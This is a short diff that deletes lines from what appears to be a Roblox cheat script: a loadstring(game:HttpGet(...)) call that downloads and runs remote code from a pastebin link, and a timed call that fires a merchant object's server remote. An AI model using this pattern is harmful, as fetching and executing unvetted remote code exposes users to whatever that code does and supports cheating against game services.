@@ -1,4 +1,1 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/XiN9XAaM"))() -- ez
 
-wait(180)
-game:GetService("Workspace").Merchants.BetterDrinkMerchant.Clickable.Return:FireServer()
